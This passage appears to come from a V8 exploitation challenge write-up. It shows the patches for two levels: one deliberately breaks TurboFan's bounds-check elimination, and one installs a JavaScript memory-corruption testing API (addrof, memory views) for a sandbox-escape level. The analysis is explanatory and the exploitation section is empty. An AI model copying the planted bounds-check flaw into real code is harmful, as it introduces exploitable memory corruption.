                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
```

## Level 8 - Min Max Dilemma

### Patch Analysis

```diff
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index 02a53ebcc21..006351a3f08 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -1888,11 +1888,11 @@ class RepresentationSelector {
         if (lower<T>()) {
           if (index_type.IsNone() || length_type.IsNone() ||
               (index_type.Min() >= 0.0 &&
-               index_type.Max() < length_type.Min())) {
+               index_type.Min() < length_type.Min())) {
             // The bounds check is redundant if we already know that
             // the index is within the bounds of [0.0, length[.
             // TODO(neis): Move this into TypedOptimization?
-            if (v8_flags.turbo_typer_hardening) {
+            if (false /*v8_flags.turbo_typer_hardening*/) {
               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
             } else {
               DeferReplacement(node, NodeProperties::GetValueInput(node, 0));
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
```

## Level 9 - V8 SBX Escape

### Patch Analysis

```diff
diff --git a/BUILD.bazel b/BUILD.bazel
index 3d37f45cede..584701ef478 100644
--- a/BUILD.bazel
+++ b/BUILD.bazel
@@ -1921,6 +1921,8 @@ filegroup(
         "src/sandbox/external-pointer.h",
         "src/sandbox/external-pointer-table.cc",
         "src/sandbox/external-pointer-table.h",
+		"src/sandbox/testing.cc",
+		"src/sandbox/testing.h",
         "src/sandbox/sandbox.cc",
         "src/sandbox/sandbox.h",
         "src/sandbox/sandboxed-pointer-inl.h",
diff --git a/BUILD.gn b/BUILD.gn
index 7ef8c1f2e06..d0538db38c3 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -304,18 +304,18 @@ declare_args() {
 
   # Enable the experimental V8 sandbox.
   # Sets -DV8_SANDBOX.
-  v8_enable_sandbox = false
+  v8_enable_sandbox = true
 
   # Enable external pointer sandboxing. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINRTERS.
-  v8_enable_sandboxed_external_pointers = false
+  v8_enable_sandboxed_external_pointers = true
 
   # Enable sandboxed pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_POINTERS.
-  v8_enable_sandboxed_pointers = false
+  v8_enable_sandboxed_pointers = true
 
   # Enable all available sandbox features. Implies v8_enable_sandbox.
-  v8_enable_sandbox_future = false
+  v8_enable_sandbox_future = true
 
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
@@ -3332,6 +3332,7 @@ v8_header_set("v8_internal_headers") {
     "src/sandbox/sandbox.h",
     "src/sandbox/sandboxed-pointer-inl.h",
     "src/sandbox/sandboxed-pointer.h",
+    "src/sandbox/testing.h",
     "src/snapshot/code-serializer.h",
     "src/snapshot/context-deserializer.h",
     "src/snapshot/context-serializer.h",
@@ -4353,6 +4354,7 @@ v8_source_set("v8_base_without_compiler") {
     "src/runtime/runtime.cc",
     "src/sandbox/external-pointer-table.cc",
     "src/sandbox/sandbox.cc",
+    "src/sandbox/testing.cc",
     "src/snapshot/code-serializer.cc",
     "src/snapshot/context-deserializer.cc",
     "src/snapshot/context-serializer.cc",
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 050cbdc78df..061379666a8 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -2860,7 +2860,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(Isolate* isolate) {
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -2877,13 +2877,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -2909,7 +2909,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::FLAG_expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 16015435073..ecd1fbb4116 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -24,6 +24,7 @@
 #include "src/logging/runtime-call-stats-scope.h"
 #include "src/objects/instance-type.h"
 #include "src/objects/objects.h"
+#include "src/sandbox/testing.h"
 #ifdef ENABLE_VTUNE_TRACEMARK
 #include "src/extensions/vtunedomain-support-extension.h"
 #endif  // ENABLE_VTUNE_TRACEMARK
@@ -5694,6 +5695,10 @@ bool Genesis::InstallSpecialObjects(Isolate* isolate,
   }
 #endif  // V8_ENABLE_WEBASSEMBLY
 
+  if (GetProcessWideSandbox()->is_initialized()) {
+    MemoryCorruptionApi::Install(isolate);
+  }
+
   return true;
 }
 
diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc
new file mode 100644
index 00000000000..327fd33588d
--- /dev/null
+++ b/src/sandbox/testing.cc
@@ -0,0 +1,194 @@
+// Copyright 2022 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+#include "src/sandbox/testing.h"
+
+#include "src/api/api-inl.h"
+#include "src/api/api-natives.h"
+#include "src/common/globals.h"
+#include "src/execution/isolate-inl.h"
+#include "src/heap/factory.h"
+#include "src/objects/backing-store.h"
+#include "src/objects/js-objects.h"
+#include "src/objects/templates.h"
+#include "src/sandbox/sandbox.h"
+
+namespace v8 {
+namespace internal {
+
+//#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API
+
+namespace {
+
+// Sandbox.byteLength
+void SandboxGetByteLength(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+  double sandbox_size = GetProcessWideSandbox()->size();
+  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));
+}
+
+// new Sandbox.MemoryView(args) -> Sandbox.MemoryView
+void SandboxMemoryView(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+  Local<v8::Context> context = isolate->GetCurrentContext();
+
+  if (!args.IsConstructCall()) {
+    isolate->ThrowError("Sandbox.MemoryView must be invoked with 'new'");
+    return;
+  }
+
+  Local<v8::Integer> arg1, arg2;
+  if (!args[0]->ToInteger(context).ToLocal(&arg1) ||
+      !args[1]->ToInteger(context).ToLocal(&arg2)) {
+    isolate->ThrowError("Expects two number arguments (start offset and size)");
+    return;
+  }
+
+  Sandbox* sandbox = GetProcessWideSandbox();
+  CHECK_LE(sandbox->size(), kMaxSafeIntegerUint64);
+
+  uint64_t offset = arg1->Value();
+  uint64_t size = arg2->Value();
+  if (offset > sandbox->size() || size > sandbox->size() ||
+      (offset + size) > sandbox->size()) {
+    isolate->ThrowError(
+        "The MemoryView must be entirely contained within the sandbox");
+    return;
+  }
+
+  Factory* factory = reinterpret_cast<Isolate*>(isolate)->factory();
+  std::unique_ptr<BackingStore> memory = BackingStore::WrapAllocation(
+      reinterpret_cast<void*>(sandbox->base() + offset), size,
+      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);
+  if (!memory) {
+    isolate->ThrowError("Out of memory: MemoryView backing store");
+    return;
+  }
+  Handle<JSArrayBuffer> buffer = factory->NewJSArrayBuffer(std::move(memory));
+  args.GetReturnValue().Set(Utils::ToLocal(buffer));
+}
+
+// Sandbox.getAddressOf(object) -> Number
+void SandboxGetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+
+  if (args.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  Handle<Object> arg = Utils::OpenHandle(*args[0]);
+  if (!arg->IsHeapObject()) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+
+  // HeapObjects must be allocated inside the pointer compression cage so their
+  // address relative to the start of the sandbox can be obtained simply by
+  // taking the lowest 32 bits of the absolute address.
+  uint32_t address = static_cast<uint32_t>(HeapObject::cast(*arg).address());
+  args.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+// Sandbox.getSizeOf(object) -> Number
+void SandboxGetSizeOf(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+
+  if (args.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  Handle<Object> arg = Utils::OpenHandle(*args[0]);
+  if (!arg->IsHeapObject()) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+
+  int size = HeapObject::cast(*arg).Size();
+  args.GetReturnValue().Set(v8::Integer::New(isolate, size));
+}
+
+Handle<FunctionTemplateInfo> NewFunctionTemplate(
+    Isolate* isolate, FunctionCallback func,
+    ConstructorBehavior constructor_behavior) {
+  // Use the API functions here as they are more convenient to use.
+  v8::Isolate* api_isolate = reinterpret_cast<v8::Isolate*>(isolate);
+  Local<FunctionTemplate> function_template =
+      FunctionTemplate::New(api_isolate, func, {}, {}, 0, constructor_behavior,
+                            SideEffectType::kHasSideEffect);
+  return v8::Utils::OpenHandle(*function_template);
+}
+
+Handle<JSFunction> CreateFunc(Isolate* isolate, FunctionCallback func,
+                              Handle<String> name, bool is_constructor) {
+  ConstructorBehavior constructor_behavior = is_constructor
+                                                 ? ConstructorBehavior::kAllow
+                                                 : ConstructorBehavior::kThrow;
+  Handle<FunctionTemplateInfo> function_template =
+      NewFunctionTemplate(isolate, func, constructor_behavior);
+  return ApiNatives::InstantiateFunction(function_template, name)
+      .ToHandleChecked();
+}
+
+void InstallFunc(Isolate* isolate, Handle<JSObject> holder,
+                 FunctionCallback func, const char* name, int num_parameters,
+                 bool is_constructor) {
+  Factory* factory = isolate->factory();
+  Handle<String> function_name = factory->NewStringFromAsciiChecked(name);
+  Handle<JSFunction> function =
+      CreateFunc(isolate, func, function_name, is_constructor);
+  function->shared().set_length(num_parameters);
+  JSObject::AddProperty(isolate, holder, function_name, function, NONE);
+}
+
+void InstallGetter(Isolate* isolate, Handle<JSObject> object,
+                   FunctionCallback func, const char* name) {
+  Factory* factory = isolate->factory();
+  Handle<String> property_name = factory->NewStringFromAsciiChecked(name);
+  Handle<JSFunction> getter = CreateFunc(isolate, func, property_name, false);
+  Handle<Object> setter = factory->null_value();
+  JSObject::DefineAccessor(object, property_name, getter, setter, FROZEN);
+}
+
+void InstallFunction(Isolate* isolate, Handle<JSObject> holder,
+                     FunctionCallback func, const char* name,
+                     int num_parameters) {
+  InstallFunc(isolate, holder, func, name, num_parameters, false);
+}
+
+void InstallConstructor(Isolate* isolate, Handle<JSObject> holder,
+                        FunctionCallback func, const char* name,
+                        int num_parameters) {
+  InstallFunc(isolate, holder, func, name, num_parameters, true);
+}
+
+}  // namespace
+
+// static
+void MemoryCorruptionApi::Install(Isolate* isolate) {
+  CHECK(GetProcessWideSandbox()->is_initialized());
+
+  Factory* factory = isolate->factory();
+
+  // Create the special Sandbox object that provides read/write access to the
+  // sandbox address space alongside other miscellaneous functionality.
+  Handle<JSObject> sandbox =
+      factory->NewJSObject(isolate->object_function(), AllocationType::kOld);
+
+  InstallGetter(isolate, sandbox, SandboxGetByteLength, "byteLength");
+  InstallConstructor(isolate, sandbox, SandboxMemoryView, "MemoryView", 2);
+  InstallFunction(isolate, sandbox, SandboxGetAddressOf, "getAddressOf", 1);
+  InstallFunction(isolate, sandbox, SandboxGetSizeOf, "getSizeOf", 1);
+
+  // Install the Sandbox object as property on the global object.
+  Handle<JSGlobalObject> global = isolate->global_object();
+  Handle<String> name = factory->NewStringFromAsciiChecked("Sandbox");
+  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);
+}
+
+//#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API
+
+}  // namespace internal
+}  // namespace v8
diff --git a/src/sandbox/testing.h b/src/sandbox/testing.h
new file mode 100644
index 00000000000..0c30397c3c5
--- /dev/null
+++ b/src/sandbox/testing.h
@@ -0,0 +1,28 @@
+// Copyright 2022 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+#ifndef V8_SANDBOX_TESTING_H_
+#define V8_SANDBOX_TESTING_H_
+
+#include "src/common/globals.h"
+
+namespace v8 {
+namespace internal {
+
+//#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API
+// A JavaScript API that emulates typical exploit primitives.
+//
+// This can be used for testing the sandbox, for example to write regression
+// tests for bugs in the sandbox or to develop fuzzers.
+class MemoryCorruptionApi {
+ public:
+  V8_EXPORT_PRIVATE static void Install(Isolate* isolate);
+};
+
+//#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API
+
+}  // namespace internal
+}  // namespace v8
+
+#endif  // V8_SANDBOX_TESTING_H_
```

This patch introduces a API for the V8 sandbox, which provides JS-accessible primitives to manipulate and inspect memory inside the sandbox — mimicking primitives such as reading addresses, getting object sizes, and reading/writing memory via views.

It enables V8's sandboxing features by modifying `BUILD.gn` to turn on flags such as `v8_enable_sandbox`, `v8_enable_sandboxed_external_pointers`, and related options. It introduces a new API under the `MemoryCorruptionApi` class. The API is installed into the global JavaScript context by modifying `Genesis::InstallSpecialObjects`, allowing direct access from JavaScript. 

Once installed, the patch exposes several JS-accessible methods: 
- `Sandbox.byteLength` returns the total size of the sandbox
- `Sandbox.MemoryView(offset, size)` creates a view over a specified memory range
- `Sandbox.getAddressOf(obj)` retrieves the memory address of a given object
- `Sandbox.getSizeOf(obj)` returns the size in bytes of a heap-allocated object

Let's look at them in detail-

```diff
+  if (GetProcessWideSandbox()->is_initialized()) {
+    MemoryCorruptionApi::Install(isolate);
+  }
```
Adds the Sandbox object to the JS global scope if the sandbox is initialized.

```cpp
class MemoryCorruptionApi {
 public:
  V8_EXPORT_PRIVATE static void Install(Isolate* isolate);
};
```
Defines the `MemoryCorruptionApi` class. Straightforward header file declaring the installation function named `Install`.

`src/sandbox/testing.cc` contains the core of the patch — it defines the JS API.

```cpp
void SandboxGetByteLength(const v8::FunctionCallbackInfo<v8::Value>& args) {
  double sandbox_size = GetProcessWideSandbox()->size();
  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));
}
```
This function exposes the size of the sandbox to JavaScript. 

```cpp
std::unique_ptr<BackingStore> memory = BackingStore::WrapAllocation(
  reinterpret_cast<void*>(sandbox->base() + offset), size, ...
);
```
This lets JS create a direct view over any part of sandbox memory.

Could be used to read or write arbitrary memory within the sandbox.

Proper bounds checks are done, but this is still dangerous by design.

```cpp
uint32_t address = static_cast<uint32_t>(HeapObject::cast(*arg).address());
```

Returns compressed pointer (lower 32 bits of HeapObject address).
This mimics addrof in exploit terminology — useful for sandbox testing and fuzzing.

```cpp
int size = HeapObject::cast(*arg).Size();

```
 Returns the object's size. Useful for calculating memory layouts.
```cpp
 JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);
```

Adds Sandbox object to the global scope.

TODO - add more details about code, its usage in JS and then sandbox internals 

## Exploitation



## Credits

> Hey There! If you have any ideas for improvements, feel free to reach out to me on X!
If your suggestion proves helpful and gets implemented, I’ll gladly credit you in this dedicated Credits section. Thanks for reading!
{: .prompt-info }